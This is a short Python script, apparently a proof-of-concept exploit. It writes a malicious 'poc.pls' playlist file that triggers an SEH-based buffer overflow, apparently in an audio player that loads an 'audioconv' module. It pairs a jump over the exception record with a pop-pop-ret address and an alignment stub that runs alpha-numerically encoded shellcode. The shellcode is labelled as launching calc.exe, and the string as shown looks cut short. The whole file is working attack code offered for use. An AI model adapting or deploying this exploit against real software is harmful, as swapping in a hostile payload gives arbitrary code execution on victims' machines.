import socket
#shellcode running calc.exe alpha2 encoded basereg edx
shell="JJJJJJJJJJJJJJJJJ7RYjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIlKXlpUnkxlqx7P7PQ0fOrHpcparLQsLMaUzXPPNXKwOcxBCGKOZpA" 
junk="B" * (4432 - len(shell))  #seh overwritten after 4432 bytes
nseh= "\xEB\x06\xEB\x06" # jmp forward 
seh= "\xF1\x8E\x03\x10" # nice ppr from audioconv
align="\x61\x61\x61\xff\xE2" # popad / popad / popad / jmp edx
buffer= shell + junk + nseh + seh + "\x90" * 20 + align  + "A"* 10000#  added some nops after seh
  
mefile = open('poc.pls','w');
mefile.write(buffer);
mefile.close()